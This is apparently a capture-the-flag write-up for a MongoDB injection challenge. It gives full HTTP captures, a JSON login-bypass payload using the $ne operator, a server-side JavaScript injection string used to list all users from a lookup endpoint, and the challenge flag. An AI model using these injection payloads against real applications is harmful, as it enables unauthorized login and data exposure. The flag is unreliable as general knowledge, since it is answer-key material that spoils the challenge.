# Tags
- Mongodb
- NoSQL injection
- JS injection

# Intro

Welcome to the MongoDB Injection Maze! Your mission is to exploit a vulnerable web application that uses MongoDB as its database backend. Your goal is to penetrate into the system by leveraging MongoDB injection

# MongoSQL Vulnerability
A site is given that seems to be able to do MongoDB Injection. There is no source code. The first step is to break through the login page.

After trying some mongodb payloads with burpsuite we alway get the following response:

```
HTTP/2 302 Found
Date: Thu, 07 Sep 2023 09:25:49 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 56
X-Powered-By: Express
Location: /login
Vary: Accept
X-Xss-Protection: 1; mode=block
Server: ArvanCloud
X-Sid: 4104
Server-Timing: total;dur=224
X-Request-Id: 9e1568c97968615ce95c8232264ffd06

<p>Found. Redirecting to <a href="/login">/login</a></p>
```

It seems like, when we fail the login it will redirect to the login page.
However when we add the following payload:

```
POST /login HTTP/2
Host: cp.uctf.ir
Cookie: ssid=s%3A5303d8b9-1021-4197-a80c-b16b39f36283.rDQ9mtIhm0QstGCUND6iZWRKMLK1LyGYB37wDwN9j7E; ba07499ab750e5460403c776a406d8aa=2f5d7fb3ebb84203292b3e716d6376d1
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://cp.uctf.ir/login
Content-Type: application/json
Content-Length: 49
Origin: https://cp.uctf.ir
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

{"username":{"$ne": "x"},"password":{"$ne": "x"}}
```

Note: Change the content-type to application/json!
We are redirect to /home page:


```
HTTP/2 302 Found
Date: Thu, 07 Sep 2023 09:27:33 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 54
X-Powered-By: Express
Location: /home
Vary: Accept
Set-Cookie: ssid=s%3A5303d8b9-1021-4197-a80c-b16b39f36283.rDQ9mtIhm0QstGCUND6iZWRKMLK1LyGYB37wDwN9j7E; Path=/; Expires=Thu, 14 Sep 2023 09:27:33 GMT; HttpOnly
X-Xss-Protection: 1; mode=block
Server: ArvanCloud
X-Sid: 4103
Server-Timing: total;dur=236
X-Request-Id: 72f92886bdff906c9aa7df318b096688

<p>Found. Redirecting to <a href="/home">/home</a></p>
```

So lets copy the cookie to our browser and look for the flag in the /home page.
In this page, seems to have a staff lookup functionality. If we try regex, such as .* we can't find nothing.
The page is making requests to GET /lookup/<input>. 
Using the payload: `'; return true; var d='` we are able to see the list of users. The payload bypasses the conditional expression and store the values in a variable.
The flag is: `UCTF{7_Burukh_Kuchase}`
